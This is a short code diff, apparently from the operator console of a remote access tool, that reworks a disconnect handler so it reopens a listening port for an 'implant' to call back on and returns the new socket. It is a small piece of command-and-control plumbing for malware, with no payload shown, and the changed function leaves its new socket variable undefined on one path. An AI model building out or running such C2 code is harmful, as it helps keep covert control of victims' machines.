@@ -6,7 +6,7 @@ import RAT
 import Common
 
 
-def handleDisconnect(sock : socket.socket, callback : int, callback_port : int) -> bool:
+def handleDisconnect(sock : socket.socket, callback : int, callback_port : int) -> socket.socket:
 
     # DisconnectCommand -> CommandDetails -> Command
     disconnect_sleep = Common.DisconnectCommand(sleep=callback, callbackport=callback_port)
@@ -23,9 +23,9 @@ def handleDisconnect(sock : socket.socket, callback : int, callback_port : int) 
     # Now re-establish our connection to our implant (if the user wanted to)
     if (callback_port != 0):
         print(f"Reopening port {callback_port} for implant to call back in on...")
-        sock = RAT.establishConnection('0.0.0.0', callback_port)
-        if (not sock):
+        new_sock = RAT.establishConnection('0.0.0.0', callback_port)
+        if (not new_sock):
             print("Failed to re-establish connection with implant!")
-            return False
+            return 0
 
-    return True
+    return new_sock
